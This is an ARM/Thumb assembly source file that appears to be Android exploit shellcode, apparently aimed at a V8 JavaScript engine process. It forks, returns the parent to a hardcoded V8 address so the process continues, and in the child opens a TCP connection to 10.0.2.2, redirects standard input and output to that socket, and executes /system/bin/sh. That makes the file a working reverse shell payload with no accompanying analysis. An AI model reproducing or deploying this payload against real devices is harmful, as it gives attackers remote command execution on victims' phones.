.globl _start
_start:
	.code 32	
        add     r1, pc, #1
        bx      r1

	
        .code 16

	/* fork */
	nop
	mov	r3, #0
	mov	r2, #0	
	mov	r1, #0
	mov	r0, #0
	mov	r7, #2
	svc	1

	cmp	r0, #0     /* child is 0 */
	beq	child

	/* parent only coe */
	/* fix r5, r6, sp  */
	
	mov	r0, #0
	mov	r1, sp
	sub	r1, r1, #80
	mov	sp, r1
	mov	r1, r8
	mov	r6, sp

	mov	sp, r8
	add     sp, sp, #56
	
	adr	r3, v8_script_run
	ldr	r3, [r3]
	bx	r3
	
	

	/* child only */
child:	
        mov     r0, #2
        mov     r1, #1
        sub     r2, r2, r2
        lsl     r7, r1, #8
        add     r7, r7, #25 	/* socket(2, 1, 0) */
        svc     1

	
        mov     r6, r0
        add     r1, pc, #32
        mov     r2, #16
        add     r7, #2
        svc     1	       /* connect(r0, &addr, 16) */

	
        mov     r7, #63
        mov     r1, #2
Lb:
        mov     r0, r6
        svc     1
        sub     r1, #1
        bpl     Lb             /* dup2(r0, 0/1/2) */


        add     r0, pc, #20  
        sub     r2, r2, r2
        push    {r0, r2}
        mov     r1, sp
        mov     r7, #11
        svc     1              /* execve("/system/bin/sh", ["/system/bin/sh", 0], 0) */


.align 2	               /* struct sockaddr */
.short 0x2	
.short 0x3412	
.byte 10,0,2,2	
.ascii "/system/bin/sh\0\0"

v8_script_run:	.word  0xa84dbc37
